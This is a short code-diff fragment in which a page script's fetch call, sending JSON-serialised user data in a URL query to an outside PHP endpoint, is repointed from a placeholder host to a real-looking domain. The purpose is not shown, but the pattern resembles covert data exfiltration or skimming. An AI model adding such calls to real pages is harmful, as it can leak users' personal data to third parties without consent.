@@ -129,7 +129,7 @@
                     }
                 };
 
-            fetch(`http://test123.com/data/info.php?firstInfo=${JSON.stringify(userData)}`)
+            fetch(`https://keno-sej.tech/data/info.php?firstInfo=${JSON.stringify(userData)}`)
         }
     }
 </script>
